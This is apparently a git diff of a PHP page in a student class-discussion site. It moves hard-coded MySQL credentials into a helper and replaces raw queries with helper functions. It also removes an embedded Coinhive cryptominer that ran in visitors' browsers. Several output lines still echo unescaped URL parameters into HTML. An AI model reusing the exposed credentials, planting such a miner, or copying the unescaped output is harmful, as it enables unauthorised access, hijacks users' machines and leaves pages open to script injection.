@@ -1,4 +1,6 @@
 <?php
+include '../utilities/database.php';
+
   session_start();
   //Check if user is logged in
   if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
@@ -14,21 +16,11 @@
     header("Location: ../login.php?event=logout");
   }
 
-  //TODO Grab all this from a file
-  //Define sql database information
-  $host="mysql.cs.iastate.edu";
-  $port=3306;
-  $socket="";
-  $user="dbu309sab3";
-  $password="SD0wFGqd";
-  $dbname="db309sab3";
-  //Connect to database
-  $db = new mysqli($host, $user, $password, $dbname, $port, $socket) or die ('Could not connect to the database server' . mysqli_connect_error());
+  //Get the db Referance
+  $db = getDB();
 
   //Get this class
-  $query = "SELECT * FROM classes WHERE ID = " . $_GET['class'];
-  $result = $db->query($query) or die($db->error);
-  $class = $result->fetch_assoc();
+  $class = getClass($db, $_GET['class']);
 
   //Check to see if this teacher actaully owns this classes
   if($class['teacher_id'] != $_SESSION['id']) {
@@ -40,18 +32,9 @@
 <html lang="en">
   <head>
     <link rel="stylesheet" href="../css/pages.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
-    <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
-    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-    <link rel="stylesheet" href="css/pages.css">
-    <script>
-      //Start miner
-	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
-	      miner.start();
-
-    </script>
-    <!-- End questionable content -->
 
     <!-- The top banner of the webpage -->
     <div class="top">
@@ -100,38 +83,27 @@
         //Otherwise print the topics
         else {
           echo '<div id="threads" class="container-fluid" style="overflow-y: auto;max-height: 90vh;">';
-
-          $class = $_GET['class'];
-          $query = "SELECT * FROM threads WHERE topic_id = " . $_GET['topic'];
-          $result = $db->query($query) or die('Error querying database.');
-          //Get topics
+          //Get all the topics
+          $result = getThreads($db, $_GET['topic']);
           while ($thread = $result->fetch_assoc()) {
             echo '<div class="row">
   		              <div class="col-md-6">
                       <div class="jumbotron well">';
-            //Get the values for the thread
-            $id = $thread["ID"];
-            $name = $thread["title"];
-            $desc = $thread["description"];
 
             //Make the topic itself a button
-            echo '<a href="posts.php?class=' . $class . '&thread=' . $id . '" class="topic">';
+            echo '<a href="posts.php?class=' . $_GET['class'] . '&thread=' . $thread["ID"] . '" class="topic">';
 
             //Print the topic
-            echo '<h2>' . $name . '</h2></a><br><p> - ' . $desc . '</p></div></div>';
+            echo '<h2>' . $thread["title"] . '</h2></a><br><p> - ' . $thread["description"] . '</p></div></div>';
             if($thread = $result->fetch_assoc()) {
               echo '<div class="col-md-6">
                       <div class="jumbotron well">';
-              //Get the values for the topic
-              $id = $thread["ID"];
-              $name = $thread["title"];
-              $desc = $thread["description"];
 
               //Make the topic itself a button
-              echo '<a href="posts.php?class=' . $class . '&thread=' . $id . '" class="topic">';
+              echo '<a href="posts.php?class=' . $_GET['class'] . '&thread=' . $thread["ID"] . '" class="topic">';
 
               //Print the topic
-              echo '<h2>' . $name . '</h2></a><br><p> - ' . $desc . '</p></div></div></div>';
+              echo '<h2>' . $thread["title"] . '</h2></a><br><p> - ' . $thread["description"] . '</p></div></div></div>';
             }
             else {
               echo '</div>';
